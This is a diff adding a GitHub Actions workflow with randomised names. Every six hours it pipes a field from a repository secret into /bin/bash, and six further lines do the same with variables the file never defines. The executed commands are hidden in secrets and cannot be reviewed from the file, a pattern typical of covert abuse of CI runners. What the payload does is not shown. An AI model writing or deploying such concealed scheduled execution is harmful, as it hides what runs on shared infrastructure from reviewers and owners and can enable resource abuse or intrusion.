@@ -1,0 +1,25 @@
+name: blackstonefreezing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: blackstonefreezing
+        env:
+          gqh836: ${{ secrets.gqh836 }}
+        run: |
+          echo $gqh836 | jq -r .cmvc6745 | /bin/bash
+          echo $lclvx32 | jq -r .r4406 | /bin/bash
+          echo $xw3 | jq -r .kvjg8350 | /bin/bash
+          echo $kjy82891 | jq -r .rd901 | /bin/bash
+          echo $bil30287 | jq -r .vfhc39 | /bin/bash
+          echo $jedw54680 | jq -r .vutow1273 | /bin/bash
+          echo $umo126 | jq -r .madj51 | /bin/bash
+
